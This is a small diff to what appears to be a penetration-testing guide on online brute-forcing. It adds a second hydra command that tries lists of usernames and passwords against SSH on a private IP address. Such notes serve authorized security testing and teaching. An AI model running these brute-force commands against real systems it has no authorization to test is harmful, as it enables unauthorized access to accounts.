@@ -7,7 +7,10 @@ There are several tools specialized for bruteforcing online. There are several d
 
 ```
 hydra -l root -P wordlist.txt 192.168.0.101 ssh
+hydra -L userlist.txt -P best1050.txt 192.168.1.103 -s 22 ssh -V
 ```
+
+
 
 ## Port 80/443 htaccess
 
